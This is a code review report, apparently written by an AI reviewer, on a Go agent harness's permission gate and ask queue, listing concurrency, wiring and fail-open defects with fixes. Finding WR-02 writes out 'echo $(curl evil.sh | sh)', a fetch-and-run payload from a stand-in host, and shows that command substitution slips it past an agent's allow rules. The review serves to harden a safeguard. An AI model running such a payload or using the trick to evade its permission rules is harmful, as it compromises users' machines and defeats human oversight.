---
phase: 17-permissions-elicitation
reviewed: 2026-09-01T12:00:00Z
depth: deep
files_reviewed: 30
files_reviewed_list:
  - docs/permissions-gate.md
  - internal/acp/handlers.go
  - internal/acp/handlers_test.go
  - internal/acp/request_registry_test.go
  - internal/acp/server.go
  - internal/acp/server_test.go
  - internal/acp/types.go
  - internal/acpserve/acp_serve.go
  - internal/acpserve/ask_drain_test.go
  - internal/acpserve/ask_surface.go
  - internal/acpserve/ask_surface_test.go
  - internal/acpserve/config_surface.go
  - internal/acpserve/config_test.go
  - internal/acpserve/permissions_e2e_test.go
  - internal/perm/rules.go
  - internal/perm/rules_test.go
  - internal/perm/store.go
  - internal/perm/store_test.go
  - internal/runtime/ask_wiring_test.go
  - internal/runtime/runtime.go
  - internal/session/ask.go
  - internal/session/askqueue.go
  - internal/session/askqueue_test.go
  - internal/session/elicitation_reply_test.go
  - internal/session/gate.go
  - internal/session/gate_test.go
  - internal/session/goconst_constants.go
  - internal/session/planmode_test.go
  - internal/session/projector.go
  - internal/session/session.go
findings:
  critical: 5
  warning: 4
  info: 3
  total: 12
status: findings_found
---

# Phase 17: Code Review Report

**Reviewed:** 2026-09-01T12:00:00Z
**Depth:** deep (cross-file: session → runtime → acpserve → acp → enginebridge → engine)
**Files Reviewed:** 30
**Status:** issues_found

## Summary

The phase's core machinery is largely sound: the perm grammar (D-02) has a genuinely strong CC-parity test battery, the store honors the 0600/atomic-rename discipline with a tested rename-failure rollback, the ask queue's one-outstanding/drain semantics are well tested under `-race`, and the E2E battery drives the real composition over pipes. The no-second-gate grep discipline holds (`perm.RuleSet.Evaluate` appears in internal/session only in gate.go:178, non-test).

However, five critical defects survive that battery, all at the seams the tests do not drive: (1) a multi-tool assistant response in gated mode silently drops all but the LAST permission suspension, leaving a permanently unpaired `tool_use` that breaks the next provider call; (2) every new resume path (queue pump, drain, D-01 timer) re-enters `runTurn` WITHOUT the per-session turn mutex the runtime's own 12-07 discipline requires, so a dialog answer racing a new client prompt runs two model loops on one transcript; (3) `session/cancel` is dispatched inline in the reader goroutine and the D-13 drain resolves queued asks synchronously — full model resumes execute inside the read loop, stalling the whole connection; (4) D-07's automation-decline contract is dead code in production: `SetTurnOriginAutomation` has zero non-test callers, so cron turns open permission dialogs the doc promises they never will; (5) permission suspensions never arm the broker settle seam the engine's ask-wait consumes, so engine chains either exit silently at a gated dialog or hot-spin on a stale channel. Four warnings and three info items follow.

## Critical Issues

### CR-01: Multi-call batch drops all but the last permission suspension (lost ask, unpaired tool_use, provider-breaking)

**File:** `internal/session/session.go:439-527` (declaration at 439; overwrites at 449 and 516; single consumption at 592-596)

**Issue:** `runTurn` tracks gate suspensions in a single pointer, `var gateSuspended *pendingPermission`. Both dispatch branches assign it (`gateSuspended = &pendingPermission{...}` at line 449 for the subagent branch and line 516 for the batch branch). When the model emits TWO gated ask-class calls in one response (e.g. `Write` + `Bash`, or `Task` + `Write` — normal provider behavior, and `DispatchBatch` exists precisely for batches), the second suspension OVERWRITES the first. The dropped call: its `tool_call` line was already recorded (line 428), but it gets no `ask_suspended` marker, no queue entry, no tool result — ever. The resumed turn's projection (`accumulateMidTurn`) then emits an assistant message whose batch carries two `tool_use` blocks against one `tool_result`; the Anthropic-protocol provider rejects the unpaired `tool_use` on the next request, so the whole resumed turn fails. The dropped call also silently never executes and never asks — it vanishes. `gate_test.go` exercises only single-call batches, so this is untested. (The ask-family loop at lines 539-616 has the same single-slot shape for `suspendedCallID`, but the gate path is this phase's new code.)

**Fix:** Collect suspensions instead of overwriting; the ask queue already serializes firing of multiple entries:

```go
var gateSuspensions []pendingPermission
...
if v.action == gateSuspend {
    gateSuspensions = append(gateSuspensions,
        pendingPermission{callID: callID, tool: tc.Name, input: tc.Input})
    continue
}
...
for i := range gateSuspensions {
    s.suspendForPermission(turnID, gateSuspensions[i].callID,
        gateSuspensions[i].tool, gateSuspensions[i].input)
}
if len(gateSuspensions) > 0 {
    return stopAsk, nil
}
```

Add a gate_test case with two mutating `ToolCalls` in one `provider.Response` asserting two `ask_suspended` records, two surface firings (sequentially, via the queue), and two tool results.

### CR-02: Resume paths re-enter `runTurn` without the per-session turn mutex — overlapping turn drivers on one session

**File:** `internal/session/gate.go:386-388` (queue resolve → `resumePermissionAsk`), `internal/session/ask.go:819-849` (`resumePermissionAsk` → `runTurn`, no lock), `internal/session/ask.go:430` (D-01 timer → `resumeAskClaimed`, no lock); contrast `internal/runtime/runtime.go:512-515` and `internal/runtime/cron_wiring.go:35`

**Issue:** The runtime's own contract (runtime.go:508-511: "the whole turn (ask-reply resumes included) holds the session mutex"; the enginebridge post-settle injections take `adapter.ParkMu = r.sessionTurnMu(...)`; `TestAskPark_ReplyDuringParkResumesAndQueuesInjection` pins "overlapping turn drivers on one session" as the failure shape) is violated by every asynchronous resume. The ask queue's pump goroutine calls `s.resumePermissionAsk(s.askResumeCtx, &p, &outcome)` (gate.go:387), which appends the tool result and runs the FULL resumed model loop (`runTurn` at ask.go:841) holding nothing. `Run` released `turnMu` when the suspending prompt returned `stopAsk`. Concrete race: turn 1 suspends with an open dialog; the operator types a new prompt (Run takes the free `turnMu` and streams a full turn); the operator then clicks Allow — the pump's resumed `runTurn` now executes tools, streams, and appends transcript lines CONCURRENTLY with the client's turn on the same session. Same shape for the D-01 timer resume (ask.go:430, pre-existing) and for every drain resolution. This is a logic concurrency defect (per-session turn serialization broken), exactly the class the phase context flags as a hard requirement under `-race`-grade correctness.

**Fix:** Serialize the resume. The session cannot import runtime, so inject the mutex at composition the way `OnSuspended` injects `ParkMu` — e.g. give `GateDeps` (or a new session hook) a `ResumeSerial func(func())` wired in `sessionFor` to `r.sessionTurnMu(sessionID)`-guarded execution, and wrap the `deps.Queue.Enqueue(..., resolve)` callback and the broker's `SetOnTimeout` body with it. routeAskReply already holds the mutex via Run and must not double-lock (use a non-reentrant wrapper only on the async paths).

### CR-03: `session/cancel` drain runs full model resumes inline in the reader goroutine — connection stalls

**File:** `internal/acp/server.go:375-380` (notifications dispatched inline), `internal/acp/handlers.go:518` (`drainAsksIfPossible` in the cancel handler), `internal/session/askqueue.go:306-310` (`DrainTurn` resolves drained entries synchronously), `internal/session/ask.go:841` (each resolve runs `runTurn`)

**Issue:** `handleSessionCancel` is a notification, and `Serve` dispatches notifications inline in the reader loop (server.go:379, by design so cancel is synchronous). The D-13 drain it triggers resolves QUEUED-but-unfired asks synchronously in the drain caller's goroutine (askqueue.go:307-309), and each resolve is `resumePermissionAsk` → append + a complete `runTurn` model loop (the E2E and `TestGateTurnDeath` pin that drained turns DO resume). Scenario: dialog A open, turn B's ask queued behind it, operator hits Escape → the cancel notification blocks the READER goroutine for the duration of turn B's full resumed model turn (provider streams, tool execution) — and again for any further queued ask. No frames are read during that window: a second `session/cancel`, `session/prompt`, or even connection teardown cannot be processed. This contradicts permissions-gate.md §5 ("The session stays responsive throughout"). The OPEN dialog resolves via the pump goroutine and is fine; only the queued-drain leg stalls. (Logout and serve shutdown reach the same drain from their own goroutines and are unaffected.)

**Fix:** Decouple resolution from the drain caller: in `DrainTurn`, invoke each drained `qa.resolve` on its own goroutine (`go qa.resolve(qa.entry, AskOutcome{Cancelled: true})`), preserving the cancel-func invocation outside the mutex as today. Add a test asserting `session/cancel` returns the reader to service while a queued ask's resume is still running (fake provider that blocks until released).

### CR-04: D-07 automation-decline is unwired — `SetTurnOriginAutomation` has zero production callers

**File:** `internal/session/gate.go:145-149` (the setter), `internal/runtime/cron_wiring.go:133-206` (`runAutomationTurn` sets `r.automationProvenance` only)

**Issue:** `grep -rn SetTurnOriginAutomation internal/ cmd/` finds only the definition (gate.go:149) and test callers (gate_test.go:800,900,937). The cron firing path (`runAutomationTurn`) never marks the session's `automationTurn` flag, so every automation turn is treated as human-present. Consequences, both contradicting docs/permissions-gate.md §2.3 ("Automation/cron turns ... ask-class calls DECLINE ... in BOTH modes. Never a dialog nobody would answer"): in gated mode an automation turn's ask-class call SUSPENDS and enqueues a dialog classified FOREGROUND (gateEntryClass reads the unset flag, gate.go:394-400) that preempts real foreground asks and waits out the HUMAN-ASK window with nobody answering; explicit `ask` rules likewise open dialogs on cron turns; the D-07 decline note (the documented audit trail) never lands. The E2E battery cannot catch this because it never drives a real automation firing through the gate.

**Fix:** In `runAutomationTurn` (cron_wiring.go, around lines 167-180), bracket the turn with the flag:

```go
if sess := r.sessionFor(ctx, sessionID); sess != nil {
    sess.SetTurnOriginAutomation(true)
    defer sess.SetTurnOriginAutomation(false)
}
```

(matching the provenance set/reset shape already there), and add a wiring test that drives `runAutomationTurn` against a gated session asserting the decline note + zero surface fires.

### CR-05: Permission suspensions are invisible to the engine ask-wait — chains exit silently or spin on a stale settle channel

**File:** `internal/session/gate.go:353` (`p.settle` armed locally, never published), `internal/session/ask.go:199-200` (the broker settle seam only `Surface` arms), `internal/runtime/enginebridge/enginebridge.go:203-211` (`AskSettle` returns `sess.AskSettleChan()`), `internal/engine/observe.go:291-301` (`waitAskSettled`)

**Issue:** `suspendForPermission` creates `p.settle` and closes it in `resumePermissionAsk`, but never publishes it to the broker's `settleCh` — that seam is set only in `AskBroker.Surface` (ask.go:199-200), which the permission path never calls. The engine's ask-wait consumes exactly that seam: `EngineTurnAdapter.AskSettle()` → `sess.AskSettleChan()`. Two failure modes when an ENGINE-driven turn (EngineEnabled is the composed default in the E2E) hits a gated call: (a) no question ask ever surfaced on this session → `AskSettleChan()` is nil → `waitAskSettled` returns false immediately → the chain exits at the suspension ("unresolved ⇒ ... exits silently"), so the dialog answer's resume is engine-invisible — decisions and remaining injections are lost, the same 13-00 blocker shape `TestAskWiring_ChainSurvivesAskTimerResume` pins RED for the timer family, now replicated for permission dialogs; (b) a question ask surfaced EARLIER → `settleCh` is the STALE, already-closed channel → `waitAskSettled` returns true instantly and `awaitAskSettlement`'s `for stop == StopAsk` loop re-reads the transcript in a HOT SPIN (no backoff) on every iteration until the human finally answers the dialog — potentially hours — while misreporting the suspension as settled for decision purposes.

**Fix:** Publish the permission suspension's settle signal on the same seam. Add e.g. `AskBroker.ArmSettle(ch chan struct{})` (mutex-guarded write to `settleCh`, mirroring Surface's) or `s.publishSettle(ch)` on Session, and call it in `suspendForPermission` right after `p.settle = make(chan struct{})`. Then `AskSettleChan()` returns the live channel, `waitAskSettled` blocks until `resumePermissionAsk` closes it after the resumed turn returns, and both engine modes behave as the question family's park does. Pin with an engine-on gate test: chain turn suspends on a gated call → chain idles (parked) while the dialog is open → resumes and injects after the answer.

## Warnings

### WR-01: Corrupt permissions.yaml disables ALL deny/allow rules for the session (fail-open on a security control)

**File:** `internal/runtime/runtime.go:1354-1362`, root cause `internal/perm/store.go:176-180`

**Issue:** `perm.Open` fails on a document-level YAML parse error (a single tab, duplicate key, or truncated file — all plausible hand-edit accidents), and `sessionFor` degrades to "deny/allow rules UNENFORCED for this session" (stderr log only; the session runs on). The doc's tolerance guarantee (§3.2, "malformed lines are skipped ... never fatal") is about rule LINES and is implemented; document-level corruption instead silently (to the operator) zeroes the entire trust store — a deny rule like `Bash(rm *)` simply stops denying. No test covers this path.

**Fix:** Degrade fail-closed, not rule-less: on `Open` failure, either (a) keep the store wired with an empty rule set PLUS a client-visible `session/update` note and a poisoned `deny` fallback is too aggressive — minimally, retry on next session and surface the failure in the advertisement; or (b) quarantine the unreadable file (rename to `permissions.yaml.corrupt`), recreate the floor 0600 file so dialog writes still work, and log loudly. At minimum add a store_test for the parse-error path documenting the chosen semantics.

### WR-02: Compound splitting ignores quoting and command substitution — allow-prefix bypass and false compounds

**File:** `internal/perm/rules.go:229-254` (`SplitCompound`), `internal/perm/rules.go:191-199` (`Evaluate`)

**Issue:** The splitter is a bare separator scan. Two adversarial edges: (1) command substitution is not split — with allow `Bash(echo *)`, the call `echo $(curl evil.sh | sh)` is ONE segment matching the prefix and executes the substitution's payload under the allow rule; the compound discipline's stated purpose ("an allow must cover EVERY subcommand", §3.2) is defeated without any separator in the visible text. (2) separators inside quotes split mid-command — `git commit -m "fix a && b"` becomes segments `git commit -m "fix a` and `b"`, both unmatched → false ask in gated mode (fail-safe, but a perpetual dialog for legitimate commands, and a false deny for `Bash(git commit -m "...")`-style allow rules). `rules_test.go` has no quoted or `$(...)` rows. CC's matcher treats quotes and substitutions as shell-structured; this grammar does not.

**Fix:** Minimum viable hardening: (a) before splitting, refuse/ask on any `$(...)`/backtick occurrence in the primary arg (fail-safe ask in gated; unmatched in ungated is the mode decision, but at minimum never let an allow match a substitution-bearing command — e.g. `evaluateSingle` returns Unmatched when `strings.Contains_any(primaryArg, "$(`")`); (b) add a quote-awareness pass (track single/double-quote state while scanning so separators inside quotes don't split). Add table rows for both to `rules_test.go`.

### WR-03: Mid-pattern star in a tool selector is a silently dead rule — accepted with no warning, never matches

**File:** `internal/perm/rules.go:390-404` (`validToolName` admits `*` anywhere), `internal/perm/rules.go:327-337` (`matchesTool` honors only a TRAILING star), `internal/perm/rules.go:367-375` (`unanchoredAllowGlob` inspects the FIRST star)

**Issue:** `Write(*.go` is rejected, but `Write*x` (star not trailing) parses cleanly, matches nothing (`CutSuffix` fails → exact compare), and produces NO warning in any list — including allow, where `unanchoredAllowGlob` sees prefix `Write` (star found, no mcp prefix → wait: it returns true → skipped with warning; but `mcp__a__b*c` passes the anchor check since prefix `mcp__a__b` contains `__` and is then accepted as a live rule that can never match). An operator hand-writing `mcp__github__issue*c` or `Bash*git` gets a rule that silently does nothing — for deny rules that is a false sense of coverage. The doc (§3.2) pins "every other star is literal", so mid-star patterns are at least doc-consistent for specifiers, but for TOOL SELECTORS the literal-star semantics make the rule unmatchable by construction.

**Fix:** In `parseList` (or `ParseRule`), warn-and-keep (or warn-and-skip) when a TOOL selector contains a star that is not trailing: `if i := strings.Index(tool, "*"); i >= 0 && i != len(tool)-1 { ws = append(ws, Warning{Rule: line, Reason: "mid-pattern star in tool selector never matches"}) }`. Add rows to `TestRulesWarnings`.

### WR-04: Store load path never tightens permissions on an existing loose file or directory

**File:** `internal/perm/store.go:63-90` (`Open`), `internal/perm/store.go:237-266` (`save` chmods only its own temp file)

**Issue:** The "0600 hard file permission, 0750 dirs" discipline (§3.1) is enforced only on files the store creates or rewrites. `Open` on an EXISTING permissions.yaml neither stats-then-chmods the file nor tightens the `.ass-guard` directory: a hand-created 0644 `permissions.yaml` (or a 0755 directory created before this phase, or tightened-then-loosened by another tool) stays world/group-readable indefinitely — the trust store contents (which tools an operator denied) leak to other local users, and the doc's "hard" claim is not actually hard. `save` fixes the file only on the next dialog click.

**Fix:** In `Open`'s existing-file branch (and after `MkdirAll`), `os.Chmod` the path to `filePermOwner` and the dir to `dirPerm` when the current mode is looser (stat → compare → chmod), logging a structured warning when a correction is applied. Add a store_test seeding 0644 and asserting 0600 after Open.

## Info

### IN-01: Import-keep hack in `handleSessionSetMode`

**File:** `internal/acp/handlers.go:571`

**Issue:** `_ = redact.ScrubError(nil)` exists solely to keep the redact import live — dead code at runtime and confusing to readers.

**Fix:** Drop the call (the package has other redact users in server.go, so the import survives) or add a real scrub when this handler grows behavior.

### IN-02: Fixed sleep stands in for the pump in the fallback test

**File:** `internal/session/elicitation_reply_test.go:425`

**Issue:** `time.Sleep(50 * time.Millisecond)` assumes the queue pump consumed the fallback entry within 50ms; under loaded `-race` runs this is the repo's known flake family (the file's own sibling tests use `gateWaitFor`).

**Fix:** Replace with `gateWaitFor(t, func() bool { return fired() == 1 })` — the subsequent zero-results/pending assertions are already stable.

### IN-03: `AppendAskSuspended` error silently discarded at the suspension site

**File:** `internal/session/gate.go:360`

**Issue:** `_ = s.Manager.AppendAskSuspended(turnID, callID, payload)` — every other transcript write in the suspension path routes through loud/checked helpers (`appendToolResultLoud`, `appendError`). If the audit marker write fails, the suspension proceeds with no transcript record and no diagnostics, degrading the resume-path reconstruction the projector relies on.

**Fix:** Log the error (slog.Warn with turn/call/tool) at minimum, or route through an appendLoud-style helper consistent with the G-12-3b family.

---

_Reviewed: 2026-09-01T12:00:00Z_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: deep_
